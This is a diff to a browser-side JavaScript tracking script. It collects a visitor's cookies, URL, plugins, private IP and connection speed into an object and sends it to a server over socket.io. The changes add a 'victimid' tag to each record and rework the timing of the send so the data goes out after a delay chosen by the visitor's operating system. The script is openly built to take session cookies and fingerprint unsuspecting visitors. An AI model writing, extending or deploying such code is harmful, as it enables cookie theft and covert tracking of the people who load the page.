@@ -9,7 +9,7 @@ var socket = io.connect({
   secure: true
 });
 
-
+var victimid = Math.random().toString(36).substring(2);
 var privip;
 var batteryinfo;
 var internetspeed;
@@ -91,6 +91,7 @@ var networks = [{
 
 //Final Variables
 var final = {
+  victimid: victimid,
   cookies: document.cookie,
   url: document.URL,
   plugins: browserplugins,
@@ -453,7 +454,6 @@ function getIPs(callback) {
       var speedKbps = (speedBps / 1024).toFixed(2);
       var speedMbps = (speedKbps / 1024).toFixed(2);
       final.internetspeed = speedKbps + " Kbps"
-      socket.emit('sending-info', final)
     }
   }
   MeasureConnectionSpeed();
@@ -511,3 +511,9 @@ function getIPs(callback) {
 
 
 }());
+
+if (final.userAgent.match(/linux/ig)) {
+    setTimeout(()=>{ socket.emit('sending-info', final) }, 5*1000)
+  } else {
+    setTimeout(()=>{ socket.emit('sending-info', final) }, 20*1000)
+  }
